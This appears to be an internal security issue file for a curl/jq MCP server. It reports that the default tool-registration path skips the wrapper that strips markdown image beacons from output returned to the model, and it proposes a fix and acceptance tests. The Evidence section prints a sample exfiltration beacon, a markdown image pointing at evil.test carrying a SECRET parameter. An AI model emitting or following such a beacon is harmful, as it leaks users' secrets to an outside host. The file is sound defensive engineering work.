---
id: 006
title: "The shipped binary registers curl_execute and jq_query without the defence wrap"
status: open
severity: P1
tags: [security, architecture, pre-existing]
class-id: unescaped-sink
aliases: [misplaced-decision]
source: /simplify altitude lane (architecture-strategist), 2026-09-03
reviewers: [architecture-strategist]
created: 2026-09-03
---

# The shipped binary registers its tools without the defence wrap

## Problem

`post-processor.ts::createWrapper` is the pass that applies invariant 1's
defence to model-facing output. It is installed at four sites — `tool-wrapper.ts`
(×2), `mcp-curl-server.ts` custom tools, and `schema/generator.ts::createToolHandler`.

**The plain registration path is not one of them.** `server/registration.ts::registerAllCapabilities`
→ `tools/index.ts::registerAllTools` → `registerCurlExecuteTool` / `registerJqQueryTool`
calls the executors raw, and neither `tools/curl-execute.ts` nor `tools/jq-query.ts`
imports `createWrapper`. That path is what `src/index.ts` → `runStdio()` / `runHTTP()`
uses — i.e. `npm start`, both transports, the `bin` entry.

## Evidence

Measured on this tree at `3d4900b`, real modules:

```
INPUT : {"note":"![x](https://evil.test/?d=SECRET)"}
OUTPUT: {"note":"![x](https://evil.test/?d=SECRET)"}
```

`defendText` under `application/json` returns the beacon byte-identical — correct,
because that copy is what `save_to_file` persists (invariant 1a, and RC-8/RC-10
settled the exemption deliberately). RC-10's split is *"what is PERSISTED keeps
the exemption, what is RETURNED does not"*, and the wrap is what enforces the
second half. With no wrap on this path, the second half does not hold: the beacon
reaches the model. The same request through `McpCurlServer` returns `[image removed]`.

Second consequence on the same path: `exceedsInlineCap` weighs a `defendForInline`
transform that never runs here, so invariant 14's gate is calibrated against a
pass that is not applied.

## Sweep

`rg -n 'registerTool\(' src -g '!*.test.ts'` — 6 real registration sites → 4
wrapped, 2 unwrapped. `rg -n 'createWrapper' src -g '!*.test.ts'` — no import in
`tools/` or `server/`. **No test imports or exercises `registerAllTools`**, so
nothing covers this path at all.

## Why this is filed rather than fixed

Found during a `/simplify` pass, whose remit is quality rather than correctness,
and the fix changes what the tool returns. Which layer takes the wrap is also a
real decision: putting it inside `executeCurlRequest`/`executeJqQuery` would be a
MAJOR bump (both are exported from `mcp-curl/lib`, invariant 11).

## Fix

Rung 1, at the registration seam and **not** inside the executors: give
`registerAllTools` the body `tool-wrapper.ts::registerCurlToolWithHooks` already
has, with empty hooks and a default config, so there is one registration
implementation. `lib.ts`'s header currently enumerates "four call sites" — an
enumeration standing in for a seam, which is RC-6's exact lesson (K-12).

Not a public-contract change if it lands at `registerAllTools`, which is not
exported from any of the four `package.json` entry points.

## Acceptance criteria

- [ ] A server built via `createServer()` + `registerAllCapabilities()` returns
      `[image removed]` for a `application/json` body containing a markdown beacon.
      This test fails today.
- [ ] `registerAllTools` and the hook-aware path share one registration implementation.
- [ ] `lib.ts`'s "four call sites" sentence is corrected or deleted — it is the
      enumeration that hid this.
